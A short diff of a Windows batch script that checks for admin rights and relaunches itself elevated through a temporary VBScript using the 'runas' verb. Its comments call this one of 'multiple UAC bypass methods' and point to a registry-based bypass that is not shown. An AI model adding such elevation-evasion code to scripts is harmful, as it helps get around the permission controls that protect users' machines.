@@ -44,9 +44,9 @@ REM === Enhanced Admin Check with UAC Bypass ===
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' neq '0' (
     REM Multiple UAC bypass methods
-    echo Set UAC = CreateObject("Shell.Application") > "%temp%\elevate.vbs"
-    echo UAC.ShellExecute "%~f0", "/install", "", "runas", 0 >> "%temp%\elevate.vbs"
-    "%temp%\elevate.vbs"
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
+    echo UAC.ShellExecute "%~s0", "/install", "", "runas", 1 >> "%temp%\elevate.vbs"
+    cscript //NoLogo "%temp%\elevate.vbs"
     del "%temp%\elevate.vbs" >nul 2>&1
     
     REM Alternative UAC bypass via registry
